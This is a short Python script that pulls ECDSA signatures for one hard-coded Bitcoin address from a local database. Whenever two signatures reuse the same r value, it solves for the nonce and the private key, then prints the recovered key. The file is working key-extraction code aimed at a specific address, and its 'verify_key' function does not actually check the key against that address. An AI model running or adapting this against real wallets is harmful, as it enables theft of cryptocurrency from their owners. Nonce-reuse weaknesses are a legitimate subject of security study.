import sqlite3
import hashlib

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def recover_from_r_reuse(sigs):
    # sigs: list of {'s': int, 'z': int, 'r': int}
    # k = (z1 - z2) * (s1 - s2)^-1 mod P
    # d = (s * k - z) * r^-1 mod P
    for i in range(len(sigs)):
        for j in range(i + 1, len(sigs)):
            s1, z1, r1 = sigs[i]
            s2, z2, r2 = sigs[j]
            
            if r1 != r2: continue
            if s1 == s2: continue # Same signature, no info
            
            k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
            d = ((s1 * k - z1) * pow(r1, -1, P)) % P
            return d, r1
    return None, None

def verify_key(d, target_addr):
    # Simple check if d is valid
    if d == 0 or d >= P: return False
    return True

addr = '1AV4KGCsvtPZ9tG7hvwgb85wJyFd9xdpFv'
conn = sqlite3.connect('cryscout.db')
cursor = conn.cursor()
cursor.execute("SELECT s_int, z_int, r_int FROM signatures WHERE address = ?", (addr,))
sigs = [(int(s), int(z), int(r)) for s, z, r in cursor.fetchall()]

d, r = recover_from_r_reuse(sigs)
if d:
    print(f"!!! SUCCESS !!! Recovered Private Key for {addr}")
    print(f"Private Key: {hex(d)}")
    # Double check derivation in next step
else:
    print("Failed to recover key from R-reuse.")
conn.close()
